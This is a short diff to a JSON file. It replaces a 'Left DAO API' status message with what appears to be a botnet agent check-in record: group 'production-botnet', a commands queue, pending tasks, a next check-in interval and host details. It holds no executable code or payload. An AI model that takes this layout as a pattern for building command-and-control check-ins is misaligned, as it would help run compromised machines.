@@ -1,4 +1,16 @@
 {
-  "status": "Left DAO API active",
-  "description": "This endpoint provides left DAO functionalities."
+  "status": "ok",
+  "agent_id": "leftDao",
+  "group": "production-botnet",
+  "version": "3.1.2",
+  "uptime": 870143,
+  "tasks_pending": 0,
+  "server_time": "2026-06-10T08:09:10Z",
+  "commands": [],
+  "next_checkin": 208,
+  "system": {
+    "os": "Linux",
+    "arch": "x86_64",
+    "hostname": "node-leftDao.internal"
+  }
 }
